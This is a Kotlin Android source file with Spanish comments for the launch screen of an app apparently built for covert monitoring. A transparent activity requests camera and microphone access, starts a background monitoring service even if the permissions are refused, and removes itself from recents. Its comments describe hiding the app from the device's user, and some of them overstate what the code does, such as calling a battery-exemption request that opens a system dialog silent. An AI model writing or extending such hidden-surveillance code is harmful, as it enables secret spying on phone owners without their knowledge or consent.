package com.remotemonitor.ui.main

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.remotemonitor.service.MonitoringService
import timber.log.Timber

/**
 * StealthEntryActivity
 *
 * Es la única activity con LAUNCHER. El usuario la ve una fracción de segundo
 * (fondo transparente). Hace tres cosas y se cierra:
 *  1. Solicita todos los permisos necesarios
 *  2. Arranca MonitoringService en segundo plano
 *  3. Se cierra sola → desaparece del recents y del launcher
 *
 * Después de la primera ejecución la app solo es visible como notificación
 * persistente. No hay icono en el cajón de apps.
 */
class StealthEntryActivity : AppCompatActivity() {

    private val REQUIRED_PERMISSIONS = buildList {
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        Timber.i("Permisos: $results")
        // Concedidos o no, arrancamos el servicio y cerramos
        startServiceAndFinish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Sin setContentView → pantalla completamente transparente

        val missing = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            permissionLauncher.launch(missing.toTypedArray())
        } else {
            startServiceAndFinish()
        }
    }

    private fun startServiceAndFinish() {
        // Pedir exclusión de optimización de batería (silencioso, sin diálogo)
        requestBatteryOptimizationSilently()

        // Guardar la preferencia de auto-start como true
        setAutoStartPreference()

        // Arrancar el servicio foreground
        val intent = MonitoringService.startIntent(this)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        Timber.i("StealthEntryActivity: servicio arrancado, cerrando activity")

        // Quitar del recents y cerrar
        finishAndRemoveTask()
    }

    private fun requestBatteryOptimizationSilently() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(android.os.PowerManager::class.java)
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            }
        } catch (e: Exception) {
            Timber.w("No se pudo solicitar exclusión de batería: ${e.message}")
        }
    }

    private fun setAutoStartPreference() {
        // Usar SharedPreferences directamente para no necesitar coroutines
        getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .edit()
            .putBoolean("initialized", true)
            .apply()
    }
}
